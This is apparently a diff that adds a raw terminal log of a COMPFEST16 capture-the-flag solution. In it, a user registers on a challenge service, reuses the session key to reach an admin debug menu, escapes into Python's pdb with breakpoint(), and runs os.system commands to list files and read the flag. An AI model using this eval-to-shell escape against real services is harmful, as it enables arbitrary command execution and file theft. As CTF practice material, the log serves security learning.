@@ -1,0 +1,50 @@
+ncat challenges.ctf.compfest.id 20010
+Main Menu
+1. Login
+2. Register
+Choice: 2
+Username: cf-min
+Password: 123
+Your session key: 05368c9daea1b2bf7f9a0f1ed08105
+Main Menu
+1. Login
+2. Register
+Choice: 1
+1. Login with username and password
+2. Login with sessions key
+Select: 2
+Session key: 05368c9daea1b2bf7f9a0f1ed08105
+Administator Menu
+1. Debug
+2. Back to Main Menu
+Choice: 1
+Input command: breakpoint()
+--Return--
+> <string>(1)<module>()->None
+(Pdb) __import__('os').system('ls')
+chall.py
+0
+(Pdb) __import__('os').system('ls /')
+bin
+boot
+dev
+etc
+flag
+home
+lib
+lib64
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+0
+(Pdb) __import__('os').system('cat /flag')
+COMPFEST16{belajar_debug_pake_python_yekan_8691c490f1}
